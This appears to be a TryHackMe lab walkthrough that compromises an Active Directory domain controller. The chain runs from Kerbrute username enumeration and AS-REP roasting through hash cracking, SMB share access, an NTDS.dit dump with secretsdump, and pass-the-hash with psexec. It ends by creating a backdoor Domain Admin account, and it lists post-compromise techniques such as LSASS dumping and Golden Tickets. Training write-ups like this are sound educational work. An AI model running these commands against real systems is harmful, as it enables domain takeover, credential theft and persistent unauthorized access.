
# THM spookysec Active Directory Attack Walkthrough

## Nmap Scan

We begin with a full TCP port scan to identify open services:

```bash
nmap -p- -sS 10.10.230.172
```

**Findings:**

Several ports commonly associated with Active Directory environments are open, indicating we are likely working with a domain controller.

| Port | Service        | Description                            |
|------|----------------|----------------------------------------|
| 53   | domain         | DNS                                     |
| 80   | http           | Web server, potentially useful for foothold |
| 88   | kerberos-sec   | Kerberos authentication                |
| 135  | msrpc          | Microsoft RPC                          |
| 139  | netbios-ssn    | NetBIOS Session Service                |
| 389  | ldap           | LDAP (directory services)              |
| 445  | microsoft-ds   | SMB over TCP                           |
| 464  | kpasswd5       | Kerberos password change               |
| 593  | http-rpc-epmap | RPC over HTTP                          |
| 636  | ldapssl        | Secure LDAP                            |
| 3268 | globalcatLDAP  | Global Catalog over LDAP               |
| 3269 | globalcatLDAPs | Global Catalog over LDAPS              |
| 3389 | ms-wbt-server  | Remote Desktop Protocol                |
| 5985 | wsman          | WinRM (Windows Remote Management)      |
| 9389 | adws           | Active Directory Web Services          |

---

## Enum4linux Output

```bash
enum4linux -a 10.10.230.172
```

### Domain Information

- **Domain Name:** `THM-AD`
- **Domain SID:** `S-1-5-21-3591857110-2884097990-301047963`
- The host is confirmed to be part of a domain rather than a workgroup.

### RID Cycling Results

Despite null session restrictions, RID cycling reveals:

```plaintext
THM-AD\Administrator
THM-AD\Guest
THM-AD\krbtgt
THM-AD\ATTACKTIVEDIREC$
```

And numerous domain groups, including:

```plaintext
THM-AD\Domain Admins
THM-AD\Enterprise Admins
THM-AD\Schema Admins
```

---

## Kerberos Username Enumeration (Kerbrute)

We use Kerbrute to discover valid usernames via Kerberos:

```bash
./kerbrute_linux_386 userenum --dc 10.10.230.172 -d spookysec.local userlist.txt
```

### Valid Usernames Discovered:

```plaintext
james@spookysec.local
svc-admin@spookysec.local
robin@spookysec.local
darkstar@spookysec.local
administrator@spookysec.local
backup@spookysec.local
paradox@spookysec.local
```

These will be useful for password spraying, AS-REP roasting, or ticket abuse.

---

## AS-REP Roasting

Using Impacket’s `GetNPUsers.py`, we test for users with the "Do not require Kerberos preauthentication" setting:

```bash
GetNPUsers.py spookysec.local/ -no-pass -usersfile /tmp/attactive/users.txt -dc-ip 10.10.230.172
```

### Success:

The user `svc-admin` is vulnerable. We retrieve the AS-REP hash:

```plaintext
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:cc6c70c3[...]...
```

---

## Cracking the Hash with Hashcat

We crack the hash using mode `18200`:

```bash
hashcat -m 18200 /tmp/attactive/james.txt /usr/share/wordlists/rockyou.txt
```

### Cracked:

```
Username: svc-admin
Password: management2005
```

---

## SMB Enumeration (Authenticated)

We now authenticate to SMB using the credentials above:

```bash
smbclient -L //10.10.230.172 -U svc-admin%management2005
```

**Discovered Shares:**

| Sharename   | Type | Description               |
|-------------|------|---------------------------|
| ADMIN$      | Disk | Remote Admin              |
| backup      | Disk | 📌 Interesting — custom share |
| C$          | Disk | Default share             |
| IPC$        | IPC  | Remote IPC                |
| NETLOGON    | Disk | Logon scripts             |
| SYSVOL      | Disk | Domain-wide policy info   |

### Accessing `backup` Share

```bash
smbclient //10.10.230.172/backup -U svc-admin
```

We find `backup_credentials.txt`, base64 encoded.

```bash
cat backup_credentials.txt | base64 -d
```

### Extracted Credentials:

```plaintext
backup@spookysec.local:backup2517860
```

---

## Privilege Escalation & Domain Controller Compromise

Using the new `backup` user credentials, we proceed to dump domain secrets.

### Dumping NTDS.dit with `secretsdump.py`

```bash
secretsdump.py backup@spookysec.local:backup2517860@10.10.230.172
```

We extract NTLM hashes for all users — including `Administrator`.

---

### Pass-the-Hash to Get Domain Admin Shell

```bash
psexec.py spookysec.local/Administrator@10.10.230.172 -hashes <NTLM>:<NTLM>
```

We now have **SYSTEM-level access** on the domain controller.

---

### Creating a Persistent Admin User

```powershell
net user redteam P@ssw0rd123 /add
net group "Domain Admins" redteam /add
```

---

## Post-Compromise Activities

Once the domain controller is owned, we can:

### 🔍 Credential Extraction

- Dump LSASS with `procdump`, `mimikatz`, `nanodump`
- Extract cached credentials and Kerberos tickets

### 🚀 Lateral Movement

- Use WinRM, SMB, or WMI
- Pivot with TGTs or pass-the-ticket

### 🔐 Persistence

- Create startup scripts or scheduled tasks
- Backdoor users or forge Golden Tickets

### 📡 Recon & Exfil

- Use BloodHound or PowerView
- Access file servers, internal tools, databases

---

## Summary

This attack chain involved:

1. Username enumeration via Kerbrute
2. AS-REP roasting to crack `svc-admin`
3. Enumerating and accessing SMB shares
4. Extracting backup user creds from `backup_credentials.txt`
5. Dumping `ntds.dit` and using pass-the-hash on `Administrator`
6. Creating a new persistent domain admin user

➡️ With full domain compromise achieved, further red team or blue team tasks can now be explored depending on scope.

